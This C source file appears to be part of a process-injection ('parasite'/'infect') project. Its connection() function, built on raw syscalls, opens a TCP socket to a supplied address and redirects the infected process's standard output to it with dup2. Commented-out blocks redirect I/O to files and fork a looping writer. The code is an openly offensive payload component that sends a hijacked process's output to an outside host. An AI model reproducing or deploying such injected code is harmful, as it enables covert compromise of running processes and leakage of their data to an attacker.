#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdarg.h>
#include <time.h>
#include <fcntl.h>

#include "syscall.h"
#include "string.c"
#include "parasite.h"
#include "infect-rpc.h"

#define NULL ((void *)0)

int connection(void *data){
	char st[] = "I'M TAKAGAWA!\n";
	int pid;

	int sock;
	struct sockaddr_in *sockaddr = data;

	
	sock = sys_socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

	sys_connect(sock, (struct sockaddr *) sockaddr, sizeof(*sockaddr));

	sys_dup2(sock, 1);
//	sys_sendto(sock, "aaaa", sizeof("aaaa"));




/*
	char outpath[] = "/hey";
	char inpath[] = "/b.tmp";
	int outfd = sys_open(outpath, O_RDWR);

	sys_dup2(outfd, 1);

	sys_close(outfd);
	
	int infd = sys_open(inpath, O_RDWR);

	sys_dup2(infd, 0);
*/
/*
 * This is multi process for writing
 */
/*	struct timespec tp;
	tp.tv_sec = 5;
	tp.tv_nsec = 0;
	pid = sys_fork();
	if(pid == 0){
		while(1){
			sys_write(0, st, 15); 
			sys_nanosleep(&tp, NULL);
		}
	}
*/


	return 0;
}
